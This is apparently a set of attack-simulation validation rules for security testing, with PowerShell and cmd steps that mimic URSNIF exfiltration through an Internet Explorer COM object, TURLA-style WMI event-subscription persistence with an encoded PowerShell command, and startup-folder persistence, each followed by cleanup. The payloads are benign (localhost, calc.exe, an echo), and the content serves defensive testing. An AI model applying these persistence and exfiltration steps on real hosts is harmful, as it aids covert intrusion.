exact_source_fields.desc: This validation rule simulates data exfiltrated through iexplore.exe (Internet Explorer). The "CoCreatInstance" API function is used to create a COM instance of Internet Explorer. Then use the "Navigate()" method to send data to the server. A variant of URSNIF has been observed using this technique to send collected data back to its C2 server. URSNIF is a modified modular banking malware with backdoor functionality. Its functions include intercepting and modifying browser traffic, file downloads and uploads, establishing SOCKS proxies, system restarts and shutdowns, system information collection, and domain generation algorithms (DGA). This malware can also steal data and credentials from popular email and FTP clients as well as browsers.

host_cli_action.raw_text:
$obj = New-Object -ComObject InternetExplorer.Application
  auto,4,true
  success_zero

$obj.Navigate("http://127.0.0.1:3344")
  auto,4,true
  success_zero
  
get-process -Name iexplore | Stop-Process
  auto,4,true
	cleanup

get-process -Name ielowutil | Stop-Process
  auto,4,true
	cleanup

del C:\Windows\temp\vserver_files_dummy.zip
	auto,4,true,60
  cleanup

URSNIF 是一种经过修改的模块化银行恶意软件，具有后门功能。其功能包括拦截和修改浏览器流量、文件下载和上传、建立 SOCKS 代理、系统重启和关闭、系统信息收集和域生成算法 (DGA)。该恶意软件还能够从流行的电子邮件和 FTP 客户端以及浏览器中窃取数据和凭据。还

exact_source_fields.desc: This validation rule simulates data exfiltrated through iexplore.exe (Internet Explorer). The "CoCreatInstance" API function is used to create a COM instance of Internet Explorer. Then use the "Navigate()" method to send data to the server. A variant of URSNIF has been observed using this technique to send collected data back to its C2 server. URSNIF is a modified modular banking malware with backdoor functionality. Its functions include intercepting and modifying browser traffic, file downloads and uploads, establishing SOCKS proxies, system restarts and shutdowns, system information collection, and domain generation algorithms (DGA). This malware can also steal data and credentials from popular email and FTP clients as well as browsers.

host_cli_action.raw_text:
$obj = New-Object -ComObject InternetExplorer.Application
  auto,4,true
  success_zero

$obj.Navigate("http://127.0.0.1:3344")
  auto,4,true
  success_zero
  
get-process -Name iexplore | Stop-Process
  auto,4,true
	cleanup

get-process -Name ielowutil | Stop-Process
  auto,4,true
	cleanup

del C:\Windows\temp\vserver_files_dummy.zip
	auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates data exfiltrated through iexplore.exe (Internet Explorer). The "CoCreatInstance" API function is used to create a COM instance of Internet Explorer. Then use the "Navigate()" method to send data to the server. A variant of URSNIF has been observed using this technique to send collected data back to its C2 server. URSNIF is a modified modular banking malware with backdoor functionality. Its functions include intercepting and modifying browser traffic, file downloads and uploads, establishing SOCKS proxies, system restarts and shutdowns, system information collection, and domain generation algorithms (DGA). This malware can also steal data and credentials from popular email and FTP clients as well as browsers.

host_cli_action.raw_text:
$obj = New-Object -ComObject InternetExplorer.Application
  auto,4,true
  success_zero

$obj.Navigate("http://127.0.0.1:3344")
  auto,4,true
  success_zero
  
get-process -Name iexplore | Stop-Process
  auto,4,true
	cleanup

get-process -Name ielowutil | Stop-Process
  auto,4,true
	cleanup

del C:\Windows\temp\vserver_files_dummy.zip
	auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates how to use a WMI event filter and the user to set persistence. When the normal operating time of the system is between 300 and 400 seconds or at 15:30:40, TURLA malware uses these mechanisms to run encrypted PowerShell commands stored in the registry. This validation rule simulates the mechanism of using the "echo" command to start PowerShell.

host_cli_action.raw_text:
# ============================================================
### Set registry key

#Set-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion -Name "Payload" -Value "yeet"
#  auto,4,true,60
#  success_zero
  
# ============================================================
### Set up Event Consumer and command to be executed

# Create EventConsumer named "Syslog Consumer"
Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='Syslog Consumer'" | Remove-WmiObject;
  auto,4,true,60
  success_zero

# Tie Powershell command to EventConsumer
$Subscription = Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{name='Syslog Consumer';CommandLineTemplate="$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -enc ZQBjAGgAbwAgAEMATwBNAE0AQQBOAEQAXwBSAFUATgA=";RunInteractively='false'};
  auto,4,true,60
  success_zero

# ============================================================
### Set up the first trigger

# Create an EventFilter named "Log Adapter Filter"
Get-WmiObject __eventFilter -namespace root\subscription -filter "name='Log Adapter Filter'"| Remove-WmiObject;
	auto,4,true,60
  success_zero
  
# Bind EventFilter to EventConsumer
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.filter -match 'Log Adapter'} | Remove-WmiObject;
	auto,4,true,60
  success_zero

# Create query/condition - When time is 15:30:40
$Query1 = "SELECT * FROM __instanceModificationEvent WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=15 AND TargetInstance.Minute=30 AND TargetInstance.Second=40";
	auto,4,true,60
  success_zero
  
# Create query/condition, part 2
$EventFilter1 = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='Log Adapter Filter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query=$Query1};
	auto,4,true,60
  success_zero
  
# Tie condition to action specified in $subscription
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$EventFilter1;Consumer=$Subscription};
	auto,4,true,60
  success_zero

# ============================================================
### Set up the second trigger

# Create an EventFilter named "AD Bridge Filter"
Get-WmiObject __eventFilter -namespace root\subscription -filter "name='AD Bridge Filter'"| Remove-WmiObject;
	auto,4,true,60
  success_zero

# Bind EventFilter to EventConsumer
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.filter -match 'AD Bridge'} | Remove-WmiObject;
	auto,4,true,60
  success_zero

# Create query/condition - When uptime is between 300 and 400 seconds
$Query2 = "SELECT * FROM __instanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 400";
	auto,4,true,60
  success_zero

# Create query/condition, part 2
$EventFilter2 = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='AD Bridge Filter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query=$Query2};
	auto,4,true,60
  success_zero

# Tie condition to action specified in $subscription
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$EventFilter2;Consumer=$Subscription};
	auto,4,true,60
  success_zero

# ============================================================
### Cleanup

Get-WmiObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='Log Adapter Filter'" | Remove-WmiObject
  auto,4,true,3
  cleanup

Get-WmiObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='AD Bridge Filter'" | Remove-WmiObject
  auto,4,true,3
  cleanup
  
Get-WmiObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='Syslog Consumer'" | Remove-WmiObject
  auto,4,true,3
  cleanup
  
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "Filter ='__EventFilter.Name=""Log Adapter Filter""'" | Remove-WmiObject
  auto,4,true,3
  cleanup

Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "Filter ='__EventFilter.Name=""AD Bridge Filter""'" | Remove-WmiObject
  auto,4,true,3
  cleanup

steps.command: $Query1 = "SELECT * FROM __instanceModificationEvent WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=15 AND TargetInstance.Minute=30 AND TargetInstance.Second=40";

$Query2 = "SELECT * FROM __instanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 400";

exact_source_fields.desc:
This validation rule simulates the addition of executable files to the Windows startup folder. The program or script added to "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" will automatically execute when any user logs in to Windows. Malicious adversary utilizes this behavior as a persistence mechanism on the target host. If pushed to other systems through Group Policy, this behavior can also be used for lateral movement.
The program being added is a legitimate copy of calc.exe, which has been removed by the cleanup action.

host_cli_action.raw_text:
copy /B C:\Windows\System32\calc.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
  auto,4,true,60
  success_zero
  

del "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\calc.exe"
  auto,4,true,3
  cleanup
